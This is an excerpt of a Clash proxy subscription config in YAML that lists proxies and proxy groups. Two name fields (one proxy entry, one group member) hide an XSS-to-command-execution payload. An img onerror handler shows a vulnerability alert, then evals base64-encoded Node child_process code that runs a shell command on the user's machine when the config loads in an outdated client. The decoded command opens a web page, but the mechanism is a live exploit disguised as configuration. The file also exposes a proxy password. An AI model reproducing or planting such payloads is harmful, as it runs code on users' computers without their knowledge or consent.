...
proxies:
   ...
   - name: 🇩🇪 Http|德国02
     ...
     password: 73a4ff1c-85c8-11ea-82ef-f23c9164ca5d
     tls: true
   - name: XSS安全漏洞检测<img src=x onerror='alert(`如果您能看见此弹窗，说明您正在使用的Clash(低于v0.19.10)存在严重的安全漏洞，请尽快更新，稍后将会为您引导至Openit官网以继续`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZG9jLm9wZW5pdC5tbC9ndWlkZS93aW5kb3dzLmh0bWwnKTs=`,`base64`).toString())'>
     server: localhost
     port: 65536
     type: http
     username: "localhost"
...
proxy-groups:
  ...
  - name: 🇺🇳 禁ping区
    ...
    proxies:
      ...
      - 🇩🇪 Http|德国02
      - 🇦🇺 Http|澳大利亚
      - XSS安全漏洞检测<img src=x onerror='alert(`如果您能看见此弹窗，说明您正在使用的Clash(低于v0.19.10)存在严重的安全漏洞，请尽快更新，稍后将会为您引导至Openit官网以继续`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZG9jLm9wZW5pdC5tbC9ndWlkZS93aW5kb3dzLmh0bWwnKTs=`,`base64`).toString())'>
  - name: 🎯 全球直连
    type: select
    proxies:
      - DIRECT
